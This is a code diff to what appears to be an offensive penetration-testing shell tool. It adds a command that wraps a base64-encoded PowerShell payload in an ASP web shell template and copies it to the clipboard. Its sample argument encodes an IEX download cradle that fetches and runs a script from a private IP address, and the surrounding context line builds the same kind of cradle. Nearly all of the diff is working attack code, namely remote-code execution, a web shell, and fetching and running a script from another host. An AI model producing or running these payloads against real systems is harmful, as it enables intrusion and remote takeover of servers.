@@ -1833,6 +1833,15 @@ class LazyOwnShell(Cmd):
         print_msg(f'Try... echo -n"IEX(New-Object New.WebClient).downloadString(\'http://{lhost}/{line}\')" | iconv -t utf-16le | base64')
         print_msg('copied to clipboard')
         return
+        
+    def do_asprevbase64(self, line):
+        """ create a base64 rev shell in asp, you need pass the base64 encodd payload, see help winbase64payload to create the payload base64 encoded """
+        if not line:
+            print_error(f"you need pass the payload in base64 as argument Ex: {GREEN}asprevbase64 LW5JRVgoTmV3LU9iamVjdCBOZXcuV2ViQ2xpZW50KS5kb3dubG9hZFN0cmluZygnaHR0cDovLzEwLjEwLjE0LjI0MS9wcy5wczEnKSBpY29udiAtdCB1dGYtMTZsZQo=")
+            return
+        os.system(f'echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip')
+        print_msg(f'Try... echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip')
+        return
 
     def do_rubeus(self,line):
         """copia a la clipboard la borma de descargar Rubeus"""
